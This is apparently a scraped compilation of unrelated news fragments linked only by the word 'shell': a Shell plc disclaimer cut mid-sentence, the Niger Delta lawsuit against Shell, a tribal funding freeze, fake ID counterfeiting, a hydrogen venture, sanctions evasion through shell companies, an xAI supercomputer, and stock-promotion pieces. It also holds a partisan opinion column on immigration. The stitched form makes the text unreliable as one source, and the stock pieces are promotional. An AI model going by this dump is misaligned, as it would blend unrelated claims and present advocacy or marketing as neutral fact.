from the production of our energy products, our suppliers' carbon emissions in supplying energy for that production and our customers' carbon emissions associated with their use of the energy products we sell. Shell's NCI also includes the emissions associated with the production and use of energy products produced by others which Shell purchases for resale. Shell only controls its own emissions. The use of the terms Shell's \"Net Carbon Intensity\" or NCI are for convenience only and not intended to suggest these emissions are those of Shell plc or its subsidiaries.\n\nShell's net-zero emissions target\n\nShell's operating plan, outlook and budgets are forecasted for a ten-year period and are updated every year. They reflect the current economic environment and what we can reasonably expect to see over the next ten years. Accordingly, they reflect our Scope 1, Scope 2 and NCI targets over the next ten years. However, Shell's operating plans cannot reflect our 2050 net-zero emissions target, as this target is currently outside our planning period. In the future, as society moves towards net-zero emissions, we expect Shell's operating plans to reflect this movement. However, if society is not net zero in 2050, as of today, there would be significant risk that Shell may not meet this target.\n\nForward-looking non-GAAP measures\n\nThis release may contain certain forward-looking non-GAAP measures such as cash capital expenditure and divestments. We are unable to provide a reconciliation of these forward-looking non-GAAP measures to the most comparable GAAP financial measures because certain information needed to reconcile those non-GAAP measures to the most comparable GAAP financial measures is dependent on future events some of which are outside the control of Shell, such as oil and gas prices, interest rates and exchange rates. Moreover, estimating such GAAP measures with the required precision necessary to provide a meaningful reconciliation is extremely difficult and could not be accomplished without unreasonable effort. Non-GAAP measures in respect of future periods which cannot be reconciled to the most comparable GAAP financial measure are calculated in a manner which is consistent with the accounting policies applied in Shell plc's consolidated financial statements.\n\nThe contents of websites referred to in this release do not form part of this release.\n\nWe may have used certain terms, such as resources, in this release that the United States Securities and Exchange Commission (SEC) strictly prohibits us from including in our filings with the SEC.

            "content": "Thousands of members of the Ogale and Bille communities are suing Shell and its Nigerian subsidiary SPDC. They hold them responsible for oil spills that have harmed their communities in the Niger Delta.\n\nA pivotal hearing is underway in the UK at London's High Court as community leaders from the Niger Delta region take on oil giant Shell. The court action was initiated by the Ogale and Bille communities who have a combined population of around 50,000 people in the area of Ogoniland.\n\nThey say the oil spills caused by oil-producing activities in the region have caused immense environmental damage, destroyed the livelihoods of local communities and caused health problems. They want Shell and its Nigerian subsidiary SPDC to be held accountable.\n\nAccording to the United Nations, at least 1.5 million tons of crude oil have been spilled since 1958 in more than 7,000 incidents in the Niger Delta region.\n\nThe trial began on February 13 and is expected to continue until March 10. It was over a decade ago that local communities brought their claims to UK courts. However, Shell delayed the case repeatedly, saying they had no legal responsibility for the pollution. Last December, however, the UK Court of Appeal said the case could go ahead.\n\nThe Niger Delta region is the country's primary oil producing area. Image: next24online/NurPhoto/picture alliance\n\nLocal Nigerian communities sick of suffering\n\nThe Ogale people are an indigenous group from Southeastern Nigeria's oil-rich Niger Delta area. Since 1993, the communities of this region have been demanding accountability and compensation from Shell for widespread contamination of their land, water and air.\n\nMany people in the area rely on fishing and farming to earn a living. Oil spills have compromised this, making life a daily struggle. Accessingpotable water has become a challenge.\n\n\"I am not happy, I am suffering. I have to come under the blazing heat of the sun to fetch water,\" Blessings James, a member of the Ogale community told DW. She said had it not been for the damage caused by pollution from oil spills, she would now have running water in her home.\n\nEnvironmental experts also say residents are at risk of contracting waterborne diseases.\n\n\"That is why we see the prevalence of cancer increasing. People are getting cancer younger, even children,\" Bieye Briggs, a public health and environmental advocate, told DW.\n\nGodwin Bebe Okpabi, leader of the Ogale community, says the powerful individuals benefiting from Shell's operations in Nigeria, should consider the damage they have caused to his community.\n\n\"I want to tell them that money is blood money,\" Okpabi told DW.\n\nShell has been carrying out cleanup operations in oil-contaminated areas of Ogoniland for years and maintains they are going well. However, a recent BBC investigation found the energy giant had ignored warnings that the multi-million dollar operation has been beset by issues from the start and brought little respite for the people of Ogoniland.\n\nNigeria communities sue Shell over oil pollution To view this video please enable JavaScript, and consider upgrading to a web browser that supports HTML5 video\n\nCommunities say Shell should pay\n\nSpeaking outside the court house in London, Okpabi maintained that Shell must compensate residents for the damage.\n\n\"As we speak, people are dying in Ogale, my community,\" he told Reuters. \"It is sad that Shell will now want to take us through this very expensive, very troublesome trial, claiming one technicality or the other.\"\n\nShell has argued that most of the spills were caused by illegal third-party interference, such as pipeline sabotage and theft, which is rife in the Niger Delta.\n\nSpeaking to Reuters, a Shell spokesperson said that the litigation \"does little to address the real problem in the Niger Delta: oil spills due to theft, illegal refining and sabotage, which cause the most environmental damage.\"\n\nIn court filings, Shell's lawyers said that SPDC recognizes it is obliged to compensate those harmed by oil spills even if the company is not at fault. However, it is not to required to compensate anyone if they have previously been compensated or if spills were caused by \"the malicious acts of third parties.\"\n\nThe current four-week hearing will determine whether according to Nigerian law, the oil giant can be held liable for oil spills caused by third-party interference. A further trial will be held in 2026.\n\nCourt relieves Shell of responsibility for CO2 emissions To view this video please enable JavaScript, and consider upgrading to a web browser that supports HTML5 video\n\nEdited by: Chrispin Mwakideu",

            "content": "GREAT FALLS \u2014 After a brief but alarming freeze, tribes across Montana are able to access federal funding once again. Yet, the uncertainty of the future remains a pressing concern. Recently, I spoke with Chairman Gerald Gray of the Little Shell Tribe in Great Falls about the potential impacts of such funding disruptions.\n\nWATCH:\n\nLittle Shell Tribe affected by federal funding freeze\n\n\"We would have basically shut down our housing program and sent our employees home,\u201d Gray stated, reflecting on the chaos generated when the Office of Management and Budget issued a memo mandating a halt to all federal funding.\n\nGray was taken aback by the suddenness of the freeze. \"It was like, what the heck is happening? No one gave us any warning. And it's like, wow.\"\n\nHe emphasized the need for meaningful consultations with tribal leadership whenever significant funding decisions are made. \"You should be having consultations, positive consultations with us, because all of this stuff affects us.\"\n\nIn a troubling turn of events, tribes like the Little Shell were given a mere few hours to draw down any necessary funding before access was abruptly revoked. For many tribes, federal support is critical, with budgets heavily supplemented by government funds through treaty agreements.\n\n\"Even that little, momentary pause caused a lot of heartburn because you didn\u2019t know what was going to happen,\u201d Gray noted.\n\nFortunately, after some lobbying efforts, the federal funding freeze was lifted within three days, allowing the tribe to access much-needed resources once again. \"These funds are always under contracts; the federal government is honored with a trust and treaty obligation. A lot of these funds are based on those agreements,\" Gray explained.\n\nDespite regaining access to funding, Gray expressed concern about the precedent set by the freeze. He worries that future challenges to federal funding could lead to protracted and costly legal battles, jeopardizing funds vital to the tribe\u2019s programs and services.\n\n\"We hope that if freezes return, they are handled more systematically,\" Gray said. \"The administration needs to realize that they can\u2019t just implement changes in one broad sweep. Each program and agency needs to be examined closely.\"\n\nIt's worth noting that the recent federal funding freeze does not affect other executive orders released by the Trump administration, leaving tribal leaders uncertain about the broader implications of these policies.\n\n",

            "content": "The New York Times reports on the growing professionalism of fake IDs. While perhaps considered a rite of passage for many underage North Americans seeking to gain entry to clubs and bars, or to buy liquor, the results were often amateurish. This was famously lampooned in the comedy hit Superbad with \u201cMcLovin\u201d apprehended by a couple of jovial cops.\n\nThe new breed of fake IDs however are more sophisticated. They sport holograms, bar codes and laser engraving that can apparently pass the electronic scanners bar owners use. The makers of these more advanced fake IDs also take payment in a very modern form: cryptocurrency.\n\nThese counterfeiters advertise the polish of their product\u2014different kinds of laminate, microprinting in dots per inch, and use of polycarbonate. Some even have embedded data chips and security enhancements such as engraving and imprints more commonly seen in state-of-the-art identity cards.\n\nAnd it can be a lucrative business for the counterfeiters. The Indy Star reported on James Watt, a 26-year-old resident of Indianapolis, who was mailing an estimated 30,000 fake IDs across the United States. The biggest marvel was that he was doing it using a photo of Thor to advertise his wares.\n\nWatt was sentenced to three years of probation after he pled guilty in federal court to his business of selling fake IDs. Watt is alleged to have made the cards over a four year duration through a website that called itself the number one source for fake IDs. The site included images of the product which used a picture of actor Chris Hemsworth as movie character Thor.\n\nFederal officials claim Watt earned 14 Bitcoin from the business, which amounts to around $1.3 million. He would mail the cards late at night at public mail boxes to avoid detection. Watt pled guilty to money laundering and unlawful production of documents.\n\nThose who make and sell fake IDs can also bypass U.S. laws by basing their operations overseas while cryptocurrency transactions offer anonymity and untraceability. The cards are then shipped disguised in boxes that resemble other products such as laptop chargers or jewelry boxes.\n\nWhile the production and distribution of fake IDs is a criminal charge, some might not be aware that simply possessing a fake ID is a felony. In Florida state, for example, a charge can result in a sentence of up to five years in prison, five years on probation and fines of up to $5,000.\n\nWith identity cards getting more advanced security features, and biometrics involved, fake IDs might fall from grace in the future. But this might underestimate those looking to cut in on the business producing fakes. Technology has a way of finding itself in nefarious hands too, especially when there\u2019s money, or crypto, involved\u2026\n\nArticle Topics\n\nbiometrics | document verification | identity document",

            "content": "Listen to this article. Getting your Trinity Audio player ready...\n\nWhile the current political shift has catalyzed a resurgence and new hope for the oil and gas industry\u2019s future, green energy and decarbonization have remained of significant importance when steering the future\u2019s energy demand to something sustainable and eco-friendly. To accomplish these goals, the major industry players are still looking for multiple viable solutions. Shell International Exploration and Production Inc. continues its commitment to clean energy with its recent announcement to sponsor Advanced Ionics\u2019 development of a new class of green energy electrolyzers.\n\nAdvanced Ionics\u2019 innovative technology concentrates on speeding up the decarbonization process and will be implemented through the Shell GameChanger program. The program was founded in 1996 and devised to pertner with businesses in the preliminary stages of developing ideas promising to impact the future of the energy industry. Support, technical expertise, and funding are all provided by the Shell GameChanger program while still allowing for independence in the decision-making process.\n\nThe oil and gas mogul will assess the water-vapor electrolyzer technology with the goal of producing low-cost hydrogen. If successful, Shell will portray the compatibility and justification to meet the company\u2019s renewable hydrogen needs, and its ammonia production demands.\n\nWith a dependence on low-cost clean electricity, Advanced Ionics\u2019 electrolyzer technology utilizes onsite processes or waste heat to produce green hydrogen for under a dollar per kilogram. By capturing that process or waste heat, Advanced Ionics possesses the ability to produce hydrogen for 35 kWh/kg, which touts a decrease in electricity per kilogram of produced hydrogen by 40 percent in comparison to alkaline and PEM technologies. Just like the current electrolyzing solutions that populate the current market, the Advanced Ionics technology carries decreased capital investments.\n\n\u201cThe petrochemical industry will struggle to decarbonize without an economic path to producing and selling hydrogen and derivatives such as green ammonia,\u201d said Advanced Ionics CEO, Chad Mason, in a recent press release. \u201cThrough our partnership with Shell GameChanger, we\u2019re proving a new way to decrease the cost of green hydrogen through more efficient, symbiotic operations.\u201d\n\nGrand expectations are expected in the future. According to the International Renewable Energy Agency, today\u2019s market share of global ammonia demand should quadruple by 2050. As a result, Advanced Ionics developed and implemented the Early Access Program to navigate the growing demand while meeting the needs of hydrogen producers and consumers across the oil and gas industry and others. Serving as an avenue for Shell to join the pilot project, the Early Access Program enables future consumers to evaluate and demonstrate the Advanced Ionics water-vapor electrolyzer for individual cases with specific operating parameters. This activity and exposure will allow for the scaling process to increase.\n\n\u201cWe\u2019re excited to support Advanced Ionics through the Shell GameChanger program,\u201d said Shell GameChanger Principal, Ed Holgate, in the release. \u201cTheir innovative intermediate temperature technology, which utilizes available steam to reduce electricity consumption, promises to potentially enhance efficiency and sustainability in the petrochemical sector. Shell GameChanger is the perfect program to validate, de-risk, and nurture such groundbreaking solutions, providing the resources and expertise needed to bring them to market.\u201d",

In this article, we are going to take a look at where Shell plc (NYSE:SHEL) stands against the other cheap high dividend stocks.\n\nAccording to Deutsche Bank Wealth Management, the global economy in 2025 is expected to face some tough challenges, with growth forecasts looking modest \u2013 the US GDP at 2.0%, the Eurozone at 0.9%, and China at 4.2%. Inflation may persist due to higher fiscal spending and potential tariff hikes, which could limit central banks' ability to lower interest rates. This could in turn lead to more market volatility. Productivity has been growing slowly, and in some cases, it has even declined, affecting long-term living standards. However, AI and new technologies could help drive productivity higher, though it will take time to see noticeable results.\n\nDespite these challenges, 2025 will be about navigating turbulent times, with a clear gap between the high-tech, high-productivity US economy and Europe, which is lagging behind. Policy focus is shifting from monetary to fiscal, with China taking the lead on new initiatives. Stocks, especially in the United States, remain a strong opportunity for growth, while European equities offer potential despite economic struggles.\n\nIn Q4 2024, S&P Global reported that US domestic stocks saw a net dividend increase of $11.7 billion, which was lower than the $13.7 billion increase in the same quarter last year. Overall, dividend increases totaled $14.2 billion for the quarter, which was down from $17.5 billion in Q4 2023. For the entire year, dividends grew by $53.3 billion, a significant jump from the previous year's $36.5 billion. On a per-share basis, the broader market's dividends hit a record, growing by 6% to $19.81 per share. In Q4 last year, there were 635 dividend increases, which is a 10.2% decrease compared to the 707 increases in Q4 2023.\n\nOver the past 12 months, total dividend increases amounted to $71.4 billion, up from $65.1 billion in the previous year. Interestingly, the number of companies cutting dividends decreased by 19.5% in Q4, with only 33 companies lowering their payouts, compared to 41 the year before. Here, we discuss some of the best cheap high dividend stocks.\n\nOur Methodology\n\nFor this article, we used the Finviz stock screener to filter out stocks with dividend yields over 3% and P/E ratios under 15. We focused on picking stocks with a consistent record of paying dividends, offering dividend growth, and being financially stable to steer clear of yield traps. The list below is ranked in ascending order of the dividend yield as of February 17. We have also mentioned the P/E ratios and hedge fund sentiment as of Q3 2024.",

While Western governments impose and seek to enforce sanctions, shell companies remain a tool for Beijing and Moscow, raising questions about current enforcement strategies.\n\nFor the PRC and Russia, shell companies provide access to sanctioned goods and technologies that are crucial for military, industrial and technological development. They also clear the way to trade military-grade components or dual-use technologies without detection by Western intelligence agencies.\n\nThe PRC faces U.S. export controls on technologies that could bolster its military capabilities, including high-performance semiconductors, lithography technology and artificial intelligence (AI). While the PRC remains a global manufacturing hub, these controls have pushed PRC firms to find ways to avoid restrictions and increase domestic capabilities. PRC companies, particularly telecommunications and AI firms, have increasingly relied on front companies and third-party nations to acquire goods and technologies from the U.S. and Europe.\n\nPRC companies have used entities in Hong Kong, Macau and Southeast Asia as intermediaries. Hong Kong remains a financial hub for PRC firms seeking to access foreign technology. In many cases, goods are shipped from Western countries to shell companies in those regions, only to be re-exported to the PRC or other destinations with fewer regulatory checks.\n\nMeanwhile, after annexing Crimea in 2014 and invading Ukraine in 2022, Russia faced Western sanctions targeting key sectors such as defense, energy and technology. The measures sought to cut off Russia\u2019s access to semiconductors and other advanced equipment critical for its defense industry and broader economy. Instead of halting trade, the sanctions pushed Russia to establish a network of intermediary countries, using shell companies to mask the end destination of sensitive goods. An example is Russia\u2019s vast \u201cshadow fleet\u201d of aging, foreign-flagged tankers that ship Russian oil to market while avoiding international price controls, sanctions and maritime insurance prohibitions.\n\nThird-party countries are critical to this strategy. Nations with less stringent oversight and regulatory enforcement have become key hubs for Russian trade.\n\nThe effectiveness of shell companies underscores the difficulty of monitoring and controlling global supply chains. While the U.S. has increased sanctions and export controls on specific industries, enforcement is a persistent challenge due to the opacity of these networks. The U.S. has used secondary sanctions, which impose penalties on foreign companies that engage with sanctioned entities, to target intermediaries, but these measures can be difficult to discern and enforce.\n\nTracking the web of corporate ownership and cross-border transactions that define shell companies is challenging. As more consumer goods and financial transactions are conducted digitally, with an increasing reliance on cryptocurrencies and blockchain technology, it becomes harder for regulators to monitor and control the transactions.\n\nWhile the offshore ecosystem presents challenges in terms of transparency and enforcement, there are options for nations that impose sanctions. They can:\n\nPush for stronger global regulations requiring the disclosure of beneficial owners of shell companies.\n\nIncrease international pressure on offshore jurisdictions to make it more difficult for entities to hide behind shell companies.\n\nExpand the use of secondary sanctions against firms that help PRC and Russian entities evade sanctions, which will disrupt the flow of goods and services to restricted markets.\n\nUse emerging blockchain technology and AI-powered analytics to track financial transactions and identify links between shell companies and sanctioned entities.\n\nGreater international coordination, especially among the U.S., the European Union, and Asian and Middle Eastern partners, also is crucial to closing gaps in global sanctions enforcement.\n\nAs global trade becomes more interconnected and digital, the U.S. and its Allies and Partners must continue to adapt their strategies, using both technological innovation and diplomatic pressure, to ensure that sanctions are a powerful tool in addressing global security challenges.\n\nThe U.S. Army\u2019s 8th Theater Sustainment Command is based in Honolulu, Hawaii.",

Breaking through the false narratives reveals the truth that despite Trump\u2019s racist anti-immigration rhetoric, he did a lousy job enforcing immigration law.\n\nThe numbers for the Department of Homeland Security show Trump\u2019s underwhelming immigration enforcement performance. The term \u201cdeportation\u201d is a shorthand way of counting both \u201cremovals\u201d (the official term for a formal deportation) and \u201cexclusions\u201d (where a person is not even allowed in the United States but is sometimes applied retroactively to people already here). Deportation also often includes \u201creturns\u201d (where an undocumented person gets sent back to their country without a formal deportation).\n\nGrouping all the above categories shows Trump only deported 3,132,269 people during his first term but Biden deported over a million people more at 4,449,599. Trump beat out Obama\u2019s second term numbers of 2,871,899, but Obama edged him out during his first term with 3,160,140.\n\nClinton is the overachiever here, beating out everyone including Reagan and the two Bushes with 5,466,520 in his first term and a whopping 6,744,723 for his second.\n\nWhat the numbers show is if you want immigration law enforced and people deported, vote Democrat!\n\nSo far, Trump\u2019s second term shows the same incompetence. In the two weeks between Inauguration Day and Feb. 3, 2025, Trump deported 5,693 people. In November 2024, Biden deported 48,970, averaging around 12,200 a week. So even with Trump\u2019s great splash claiming he will deport more people in the history of America, he remains over four times behind Biden.\n\nDespite the racist barrage of insults and childish taunts, Trump once again dropped the immigration enforcement ball.\n\nDisruptive incompetence is the Trump approach. In his first term, Trump put Tom Homan in charge as ICE (Immigration Customs Enforcement) acting director. Homan now joyfully threatens local officials in so-called \u201csanctuary cities\u201d with unspecified \u201ccriminal charges\u201d while making braggadocious claims about immigration enforcement. Trump bestowing the imaginary title \u201cBorder Czar\u201d on Homan does not change the lack of competency. The latest reports are that Trump is angry over his Border Czar\u2019s low deportation numbers.\n\nTrump\u2019s frustration is to be expected. Only a competent administration would understand that the roughly 8,500 border patrol officers cannot deport the estimated 11 to 13 million undocumented persons in the country. Also, there are about 600 immigration judges with backlogged cases.\n\nMeanwhile Trump\u2019s oligarch-in-residence Elon Musk has already sent a letter to all federal employees including border patrol agents, officers, and immigration judges suggesting they take a buyout. All of this, of course, underscores the incompetency of wanting to beef up law enforcement but at the same time taking away the resources to do so.\n\nGiven these realities, the Biden success in removing people from the United States is remarkable and something Trump lacks competence to duplicate.\n\nTake the recent snafu with Colombia regarding a military plane full of Colombian (and other) deportees. Colombia is America\u2019s strongest ally in the region offsetting a true Marxist dictator in Venezuela and helping us fight the cocaine trade. Colombia always repatriated its citizens after deportations, and it had accepted over 100 flights in 2024. But the Trump/Homan immigration team did not see fit to give Colombian authorities notice before the military plane arrived. (After all, it\u2019s only polite when you invite hundreds of deportees to dinner to at least notify the host!) Moreover, they handcuffed the deportees in a military plane. Colombia rejected the plane.\n\nIf Trump destroys enough of democracy, he will discourage immigrants from coming by turning the United States into what he calls \u201ca shithole country.\u201d\n\nBut it turned out to be a great opportunity for Trump to bully an ally with the threat of tariffs into taking an airplane it would have taken anyway if the matter had been handled competently. Doing this to Colombia is not in the United States\u2019 interest.\n\nTrump\u2019s whole \u201cAmerica First\u201d schtick does nothing more than hide incompetency all the while straining diplomatic relations with Latin America and Canada. Under Biden even Venezuela was willing to repatriate their deportees. But Trump\u2019s plan now seems to be to send a bunch of people to Guant\u00e1namo Bay, Cuba at tax-payer expense? Or perhaps it is just \u201ca concept of a plan\u201d?\n\nWhat about getting tough on our two largest trading partners, Canada and Mexico because of immigration. Biden reached accords with Mexico, Honduras and Guatemala to keep undocumented immigrants out of the United States. These facts, though, do not stop Trump\u2019s false narrative about Canada and Mexico allowing everything bad to flow into America.\n\nTrump, who on the campaign trail called himself \u201cTariff Man\u201d, imposed 25% tariffs on Canadian and Mexican goods (or more accurately a 25% tax on American consumers). But it turns out Canada and Mexico cannot so easily be bullied. Canada hit back with its own counter-tariffs on $155 billion worth of goods including on Canadian eggs. So much for Tariff Man\u2019s promise to bring down the price of eggs.\n\nFor Mexico, President Claudia Sheinbaum posted, \u201cI\u2019ve instructed my economy minister to implement the plan B we\u2019ve been working on, which includes tariff and non-tariff measures in defense of Mexico\u2019s interests.\u201d Mexico is the source of countless items that create American prosperity including parts to build our cars, agricultural products like good avocados, beer and decent burritos.\n\nTariff Man backed off. For all his bragging about \u201cthe art of the deal\u201d Trump got the rest of us nothing. Once again Trump has proven his \u201cnegotiating ability\u201d is nothing more than utter shamelessness and self-promotion advanced with a kind of cunning self-interest serving himself but not us.\n\nTrump\u2019s narrative about \u201copen borders\u201d remains a false narrative with artificial milestones to claim success. (The last time the United States had \u201copen borders\u201d was in 1875 when the Page Act passed.) Under Biden, illegal crossings decreased. Biden\u2019s immigration policy was a relative success. When Biden clamped down on asylum crossings decreased by 40%. It could have been better had Trump not directed his congressional minions to kill the bipartisan border security bill.\n\nFor Trump, a pretend immigration crisis was far more important than a solution.\n\nDuring this last election, Trump rarely mentioned his signature policy from his first presidential race \u2014 building a border wall. A border wall was always a bad idea. The billions of dollars to just buy the land to put it on was prohibitive. But even leaving the cost and practicality aside, a border wall would do nothing to stop most undocumented persons. Most did not cross the Mexican border at all but instead came to the United States legally \u2014 but then didn\u2019t leave. This means that for about half of the 11 to 13 million undocumented people in America a border wall would be irrelevant.\n\nBut a border wall to stop the minority of undocumented persons would do little to block people desperate for a better life for their children. Immigration and crime would just reroute through the Canadian border. Building a wall on the Canadian border is much harder politically because, let\u2019s face it, most Canadians are white.\n\nBut even putting aside the above facts, the first Trump administration proved itself incompetent to build it. Remember, regarding building things, it was Biden, not Trump, who got an infrastructure bill passed.\n\nIn his first term, Trump failed to build a wall.\n\nHe failed to marshal the resources from Congress, failed to gain a consensus of American opinion and failed at everything administrations do in a democracy to advance policy. Trump did, however, succeed in destroying the Republican Party. Ronald Reagan saw that the Berlin Wall could not stop desperate people from finding a way. His signature statement and true moment of greatness was when declared, \u201cMr. Gorbachev, tear down this wall!\u201d A far cry indeed from Trump\u2019s boast: \u201cWe\u2019re gonna build a great big wall and have Mexico pay for it.\u201d\n\nReagan had an unfailing belief in American exceptionalism. Immigrants do come here for economic opportunity. But they want to become American because we believe that \u201call men are created equal,\u201d we uphold the Rule of Law and embrace equality of opportunity. Our open society and democratic republic drive American innovation and economic growth. It makes us different from other countries where dictators rule without democracy and oligarchs are happy.\n\nDonald Trump is anathema to these values. Unchecked, he will destroy the very things that make America great and exceptional. But maybe that is Trump\u2019s immigration plan. Destroy American institutions and make oligarchs like Elon Musk happy. If Trump destroys enough of democracy, he will discourage immigrants from coming by turning the United States into what he calls \u201ca shithole country.\u201d\n\nRobert J.

Elon Musk and senior xAI employees described Grok 3 as \u201cthe smartest AI on Earth\u201d in a recent livestream, citing each GPU\u2019s capacity of up to 4 PFLOPS (four quadrillion floating-point operations per second) and high-speed interconnects across the cluster.\n\nA custom liquid-cooling system replaces traditional fans, with Musk noting that xAI is using a design \u201cnobody\u2019s done at scale.\u201d The company also claims daily improvements to Grok 3 and is already planning further upgrades: it intends to adopt Nvidia\u2019s forthcoming H200 GPUs\u2014projected to ship with 141 GB of HBM3e memory\u2014and eventually transition to Blackwell GB200 chips, which could deliver 20 PFLOPS each. xAI says it built Colossus in significantly less time than most data center projects require, transforming the abandoned site into a major AI development facility.\n\nHow Colossus took shape\n\nA Rapid-Build Supercomputer: In 122 days, xAI transformed an abandoned Electrolux factory in Memphis into \u201cColossus,\u201d with 100,000 Nvidia H100 GPUs, then doubled it to 200,000 in another 92 days\u2014a feat born of necessity after training Grok 2 on just 8,000 GPUs. Drawing an estimated 250 megawatts, buffered by Tesla MegaPacks to handle AI training\u2019s power swings, Colossus will help xAI offer daily improvements to Grok 3.\n\nWhy Memphis? The abandoned Electrolux factory offered considerable warehouse space and an initial 15 MW of industrial power\u2014later scaled to roughly 250 MW with Tesla MegaPacks. Rejecting new construction quotes of 18\u201324 months, Musk\u2019s team leased generators and a quarter of the U.S.\u2019s mobile cooling capacity to kickstart operations fast.\n\nOvercoming Hardware Debugging: Assembling 200,000 interconnected GPUs in under a year brought chaos: mismatched BIOS firmware, network cable snarls, and cosmic-ray bit flips sparking random errors. \u201cIt\u2019s a battle against entropy,\u201d xAI\u2019s Jimmy Ba quipped, warning a single transistor flip could throw a 100,000-GPU training run off kilter. Musk recalled debugging a BIOS mismatch at 4:20 a.m., while the team unplugged cables to test stability, rerouting as needed.\n\nCore hardware and topology\n\nxAI\u2019s \u201cColossus\u201d runs on 200,000 Nvidia H100 GPUs synced by high-speed interconnects. Igor Babuschkin calls it \u201cthe biggest, fully connected H100 cluster of its kind.\u201d Each H100 packs 80 GB of HBM2e memory at 2 TB/s bandwidth and nearly 4 PFLOPS of FP8 performance with sparsity. xAI rolled out a custom liquid-cooling system after renting a quarter of the U.S.\u2019s mobile cooling units. Musk teases a next-gen evolution with Nvidia Blackwell GB200 GPUs\u201420 PFLOPS each, 8 TB/s bandwidth.\n\nSynchronous training and \u201ccontinuous daily improvement\u201d\n\nxAI\u2019s \u201ccontinuous daily improvement\u201d for Grok 3 relies on online fine-tuning and reinforcement learning for incremental updates. The cluster churns out synthetic data via smaller models, feeding Grok 3 for focused training bursts. This demands orchestration for rapid partial re-runs across the array, amid cosmic-ray bit flips and power swings that Jimmy Ba calls a \u201cbattle against entropy.\u201d\n\nA big launch, but perhaps a narrow edge\n\nEarly tests from AI researchers show mixed results. Andrej Karpathy praised Grok 3\u2019s ability to parse complex training papers but noted it struggled with certain \u201ctricky\u201d logic puzzles\u2014comparing its performance roughly to \u201co1-pro\u201d from OpenAI. While an earlier version (nicknamed \u201cchocolate\u201d) achieved an Arena score of 1402, Grok 3 itself only slightly outperforms Google\u2019s Gemini 2.0 models and OpenAI\u2019s ChatGPT-4o. Ethan Mollick called it a \u201cvery solid frontier model\u201d but added that \u201cOpenAI maintains a strong advantage\u201d in enterprise partnerships. Gary Marcus deemed the launch \u201cno game changer.\u201d xAI\u2019s internal benchmarks show Grok 3 narrowly leading competitors in math, science, and coding tasks by a few percentage points\u2014noticeable but not overwhelming.

            "content": "The country\u2019s natural gas sector is also expected to benefit significantly from the ongoing AI boom and the accompanying data centers, as several dozen new gas-fired power plants are expected to be built in the US in the next few years. According to energy data provider Enverus, a total of 80 new gas power plants could be constructed in America by 2030, adding about 46 GW of new capacity \u2013 20% higher than the gas capacity additions in the last five years. According to data from S&P Global Commodity Insights, if even a quarter of the projected data center load is supplied by gas-fired generation, this would translate to a 2% increase in total US gas demand in 2040.\n\nEurope remains a top destination for American liquified natural gas. The continent has had to rely significantly more on imported LNG and less on gas delivered via pipelines from Russia since the Putin government\u2019s invasion of Ukraine in 2022. The American LNG sector is also set to receive a significant boost after President Donald Trump issued an order last month to lift a freeze on new US licenses to export liquefied natural gas, making good on a campaign pledge to rescind the measure.\n\nAfter a stellar 2023, the US natural gas output slumped slightly last year due to prices falling to multi-decade lows, but production is expected to climb to 104.5 bcfd in 2025, as a period of strong demand and improved prices spark a resurgence in production. Analysts expect average annual gas prices to increase by more than 40% this year over the levels seen in 2024, as demand is projected to grow mainly due to a jump in LNG exports. The demand surge is largely attributed to new LNG export facilities, like Plaquemines LNG and Corpus Christi Stage 3, coming online, while the Golden Pass LNG project is also anticipated to begin operations by mid-2026.\n\nThe United States of America is the Top Natural Gas Producing Country in the World , courtesy of horizontal drilling and hydraulic fracturing techniques, notably in shale, sandstone, carbonate, and other tight geologic formations. The country\u2019s dry natural gas production reached 103.6 billion cubic feet per day (bcfd) in 2023, up 4.3% from 2022 and the highest for any year on record, dating back to 1930, according to 2023 Natural Gas Annual. The US was also a net exporter of natural gas for the seventh consecutive year in 2023, transporting gas to 42 countries during the year.\n\nWe recently published a list of 11 Best Natural Gas Stocks To Buy Now . In this article, we are going to take a look at where Shell plc (NYSE:SHEL) stands against other best natural gas stocks to buy now.\n\nStory Continues\n\nThe energy sector has witnessed considerable fluctuations over the last few months, surging by over 6% in November before declining around 10% in December. However, the broader energy sector (roughly 1/3rd of which is made up of natural gas companies) ended last year with a return of just 5.72%, significantly lagging behind gains of 25% by the wider market.\n\nMethodology\n\nTo collect data for this article, we scanned Insider Monkey\u2019s database of 900 hedge funds and picked the top 11 companies operating in the natural gas sector with the highest number of hedge fund investors in Q3 of 2024. When two or more companies had the same number of hedge funds investing in them, we ranked them by the revenue of their last financial year. Following are the Best Natural Gas Stocks to Buy According to Hedge Funds.\n\nAt Insider Monkey we are obsessed with the stocks that hedge funds pile into. The reason is simple: our research has shown that we can outperform the market by imitating the top stock picks of the best hedge funds. Our quarterly newsletter\u2019s strategy selects 14 small-cap and large-cap stocks every quarter and has returned 275% since May 2014, beating its benchmark by 150 percentage points (see more details here).\n\nIs Shell plc (SHEL) The Best Natural Gas Stock To Buy Now?\n\nA gas refinery lit up against the night sky, showing the scale of the company's petrochemical operations.\n\nShell plc (NYSE:SHEL)\n\nNumber of Hedge Fund Holders: 48\n\nShell plc (NYSE:SHEL) is an integrated energy company employing 103,000 people and with operations in more than 70 countries. The company has over 50 years of experience as a producer of natural gas and today it is one of the leading producers in Europe. Moreover, Shell has a world-leading LNG business with a sizeable portfolio, a diverse network of customers around the world, extensive shipping and storage assets, and access to regasification plants.\n\nShell plc (NYSE:SHEL) reported revenue of $66.28 billion in Q4 2024, down 15.8% YoY and missing analysts\u2019 estimates by over $5.5 billion, primarily due to declining oil and gas prices and falling oil demand. However, cash delivery remained solid and the oil and gas giant generated a free cash flow of $40 billion in 2024, higher than in 2023, despite the lower price environment. As a result, Shell announced a 4% increase in its dividends and another $3.5 billion buyback program, making it the 13th consecutive quarter of at least $3 billion of buybacks.\n\nIt was reported in December 2024 that Shell plc (NYSE:SHEL) will combine its UK offshore oil and gas assets with Equinor to form a new company that will be the UK North Sea\u2019s biggest independent producer, with a combined estimated output of 140,000 barrels of oil equivalent per day in 2025.\n\nShares of Shell plc (NYSE:SHEL) were held by 48 hedge funds at the end of Q3 2024, with Fisher Asset Management holding the largest stake valued at over $1.56 billion.\n\nOverall, SHEL ranks 6th on our list of best natural gas stocks to buy now. While we acknowledge the potential for SHEL to grow, our conviction lies in the belief that some AI stocks hold greater promise for delivering higher returns and doing so within a shorter time frame. If you are looking for an AI stock that is more promising than SHEL but that trades at less than 5 times its earnings, check out our report about the cheapest AI stock.\n\nREAD NEXT: 20 Best AI Stocks To Buy Now and Complete List of 59 AI Companies Under $2 Billion in Market Cap\n\nDisclosure: None.

